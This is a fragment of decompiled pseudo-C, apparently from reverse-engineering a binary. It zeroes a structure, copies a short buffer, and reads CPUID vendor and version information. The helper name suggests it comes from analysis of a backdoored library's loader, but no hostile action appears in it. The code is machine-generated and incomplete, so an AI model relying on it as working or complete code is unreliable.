  init_ldso_ctx(local_b10);
  lVar13 = 0;
  lVar24 = local_30;
  while (lVar24 != 0) {
    *(undefined1 *)(local_30 + lVar13) = puVar29[lVar13];
    lVar24 = lVar13 + -0x17;
    lVar13 = lVar13 + 1;
  }
LAB_00105a81:
  puVar2 = *(undefined8 **)(param_1 + 0x80);
  puVar2[1] = 0;
  puVar2[2] = 0;
  puVar2[3] = 0;
  puVar2[4] = 0;
  *puVar2 = 1;
  piVar4 = (int *)cpuid_basic_info(0);
  uVar6 = piVar4[2];
  if (*piVar4 != 0) {
    puVar26 = (undefined4 *)cpuid_Version_info(1);
    uVar5 = puVar26[1];
    uVar6 = puVar26[2];
    uVar7 = puVar26[3];
    *(undefined4 *)(puVar2 + 1) = *puVar26;
    *(undefined4 *)(puVar2 + 2) = uVar5;
    *(undefined4 *)(puVar2 + 3) = uVar7;
    *(uint *)(puVar2 + 4) = uVar6;
  }
  return ZEXT416(uVar6) << 0x40;
}

